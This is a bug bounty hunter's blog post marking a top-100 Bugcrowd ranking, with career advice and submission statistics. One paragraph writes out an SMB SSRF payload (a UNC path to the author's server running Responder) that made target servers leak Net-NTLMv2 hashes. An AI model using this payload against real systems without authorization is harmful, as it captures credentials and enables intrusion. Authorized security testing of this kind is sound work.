---
layout: single
title: Ramblings of a Top 100 Bug Hunter
date: 2021-02-15
classes: wide
header:
  teaser: /assets/images/BB.png
tags:
  - Bug Bounty
  - Penetration Testing
--- 

Today marks a huge personal milestone in my bug bounty hunting career. I have achieved an all-time ranking of top 100 on Bugcrowd. This accomplish comes just 11 months after first creating an account on the Bugcrowd platform. In this blog post I will endeavor to highlight a few things I have learned along the way. This blog post will contain some insights into the types and number of bugs I have submitted as well as any miscellaneous tips I think of while writing this.  

## Hack for Fun
The first point I would like to emphasize is the fun and learning involved in hacking. In my opinion, going into bug hunting with the sole desire to make money is unadvisable. I first started bug hunting after finishing eLearn Security’s web application pentester certification and decided I wanted to try hacking on real websites. I’ve learned so much more doing bug hunting than I have in any certification (and as an added bonus I get paid to learn this way rather than paying to learn)!  

## Be Creative
The next point I want to touch on is creativity. As I have delved deeper into the bug bounty community, I see an evident issue with creativity. What I mean by this is that so many aspiring hunters are focused on finding their first bug that they constantly flock to the newest tool or run the newest “one-liner” they see on Twitter. This is the wrong approach, instead try thinking outside of the box, fuzz parameters differently, try to break things! Once you make the website act funny you can dig deeper and try to invoke a security issue.   

An example of this I’ve encountered is SMB SSRF. Everyone knows the basic premise of SMB is to induce the web server to make an outbound HTTP request. I was looking at a program with a very tempting `uriPath=` parameter but was unable to achieve an HTTP request despite trying numerous bypasses. Out of curiosity I tried `uriPath=\\c2.mk\share` and immediate received the Net-NTLMv2 hash from the ASPX server on my VPS running Responder. This is not something I have commonly read about, but I proceeded to find it in six other parameters on this program. They were very clearly blocking outbound HTTP traffic but allowed outbound SMB traffic.  


## Dedication
Bug bounty is no different than anything else in life. You have to work hard if you want to see progress and achieve positive results. There is no such thing as a free lunch, you will have to learn and understand web application attacks and exploits, then you will have to fight and compete with thousands of other bug hunters just get your first accepted bug. There is no substitute for hard work and hours spent practicing. Sit down and start today if you want to progress tomorrow.  


<br>
I may add future ramblings here in the future ¯\_(ツ)_/¯ 


## Statistic
Alright now for the fun data and statistics. The data and screenshots below are what is required to reach Top 100 on Bugcrowd (at the time of writing this article):
-	Bugs Submitted: 313
-	Bugs Accepted: 131
-	Duplicate Bugs: 89
-	Rejected Bugs: 86 (this is largely due to how Bugcrowd handles NGPT/ CPT engagements)
-	Pending Bugs: 7


![](/assets/images/bugbounty/1.png)

Figure 1: Volume of Submitted Bugs Over Time  

![](/assets/images/bugbounty/2.png)

Figure 2: Severity of Submitted Bugs Over Time  

![](/assets/images/bugbounty/3.png)

Figure 3: Technical Severity Breakdown  

![](/assets/images/bugbounty/4.png)

Figure 4: Number of Submitted Bugs per Category  

![](/assets/images/bugbounty/5.png)

Figure 5: Points, Rank, Accuracy  

